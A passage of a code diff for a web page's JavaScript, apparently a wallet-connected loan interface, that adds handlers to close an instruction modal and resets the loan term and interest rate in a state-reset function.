         document.getElementById('closeRulesBtn').onclick = () => document.getElementById('rulesModal').classList.remove('active');
+        document.getElementById('closeInstructionModal').onclick = () => document.getElementById('instructionModal').classList.remove('active');
+        document.getElementById('closeInstructionBtn').onclick = () => document.getElementById('instructionModal').classList.remove('active');
 
         function resetState() {
             selectedNetwork = null;
@@ -1109,6 +1426,8 @@
             userBalance = 0;
             invoiceId = null;
             loanAmount = 0;
+            selectedTerm = 'month';
+            currentInterestRate = 0.05;
             document.getElementById('walletWarning').style.display = 'none';
             document.getElementById('browserWarning').style.display = 'none';
         }
